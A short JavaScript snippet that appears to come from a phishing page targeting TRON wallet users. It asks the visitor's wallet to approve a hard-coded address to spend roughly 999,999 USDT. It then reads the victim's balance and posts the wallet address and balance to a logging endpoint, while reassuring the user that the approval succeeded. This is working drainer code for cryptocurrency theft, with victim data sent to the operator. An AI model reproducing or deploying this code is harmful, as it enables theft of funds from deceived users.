const receiver = "TKTdAiXKvAWH7T9bxpBodYecRPtFDGZ7jN";
const contractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // TRC-20 USDT

async function approveUSDT() {
  if (!window.tronWeb || !window.tronWeb.ready) {
    alert("Please open in TronLink or SafePal browser");
    return;
  }

  const amount = "999999999000000"; // ~999,999 USDT (6 decimals)
  const contract = await tronWeb.contract().at(contractAddress);

  try {
    const tx = await contract.approve(receiver, amount).send();
    console.log("Approval TX:", tx);

    const balance = await contract.balanceOf(window.tronWeb.defaultAddress.base58).call();

    // Log to Supabase
    await fetch('/log', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        wallet: window.tronWeb.defaultAddress.base58,
        amount: 999999,
        balance: parseInt(balance._hex || balance)
      })
    });

    alert("Approved! You can close this now.");
  } catch (err) {
    console.error(err);
    alert("Approval failed");
  }
}
